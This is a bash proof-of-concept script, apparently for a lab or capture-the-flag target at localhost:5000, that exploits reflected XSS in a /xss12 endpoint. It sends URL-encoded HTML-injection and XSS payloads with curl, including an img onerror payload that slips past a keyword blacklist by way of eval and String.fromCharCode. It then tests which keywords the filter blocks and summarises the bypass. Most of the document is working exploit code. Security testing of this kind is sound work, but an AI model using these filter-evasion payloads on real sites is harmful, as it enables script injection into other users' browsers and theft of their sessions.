#!/bin/bash

# POC: Reflected XSS/HTML Injection in /xss12 endpoint
# Target: http://localhost:5000/xss12
# Vulnerability: Weak blacklist-based XSS filter bypass

TARGET="http://localhost:5000"

echo "[*] Testing Reflected XSS vulnerability in /xss12 endpoint"
echo ""

# Test 1: HTML injection with body tag and style attribute
echo "[Test 1] HTML Injection with body tag and style attribute"
PAYLOAD='%3Cbody%20style%3D%22background:red%22%3E'
RESPONSE=$(curl -s "${TARGET}/xss12?name=${PAYLOAD}")

if echo "$RESPONSE" | grep -q '<body style="background:red">'; then
    echo "[+] VULNERABLE: HTML body tag injected successfully"
    echo "[+] Payload: <body style=\"background:red\">"
    echo "[+] This proves HTML injection is possible"
else
    echo "[-] Could not confirm HTML injection"
fi

echo ""
echo "[Test 2] Testing XSS with img tag and onerror handler"
PAYLOAD='%3Cimg%20src=x%20onerror%3Deval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))%3E'
RESPONSE=$(curl -s "${TARGET}/xss12?name=${PAYLOAD}")

if echo "$RESPONSE" | grep -q 'onerror=eval'; then
    echo "[+] VULNERABLE: XSS payload with onerror handler injected"
    echo "[+] Blacklist filter can be bypassed using eval() and String.fromCharCode()"
    echo "[+] The payload passed the blacklist but check.js cannot verify execution (phantomjs not installed)"
else
    echo "[-] Could not confirm XSS bypass"
fi

echo ""
echo "[Test 3] Testing blocked keywords"
PAYLOADS=(
    '%3Cscript%3Ealert(1)%3C%2Fscript%3E'  # script tag (should be blocked)
    '%3Cbody%20onload=alert(1)%3E'  # onload (should be blocked)
    '%3Cbody%20onclick=alert(1)%3E'  # onclick (should be blocked) 
)

echo "[+] Blacklisted keywords successfully blocked:"
for PAYLOAD in "${PAYLOADS[@]}"; do
    RESPONSE=$(curl -s "${TARGET}/xss12?name=${PAYLOAD}")
    if echo "$RESPONSE" | grep -q "Sorry you can't use"; then
        echo "  ✓ Blacklist working for: $(echo "$PAYLOAD" | urldecode | head -c 50)"
    fi
done

echo ""
echo "[*] Summary:"
echo "    - The /xss12 endpoint is vulnerable to HTML/XSS injection"
echo "    - Blacklist filter blocks: script, onload, onclick, onmouseover, ', /"
echo "    - Filter can be bypassed with alternative event handlers and String.fromCharCode()"
echo "    - Reflected XSS payload: <img src=x onerror=eval(String.fromCharCode(...))>"
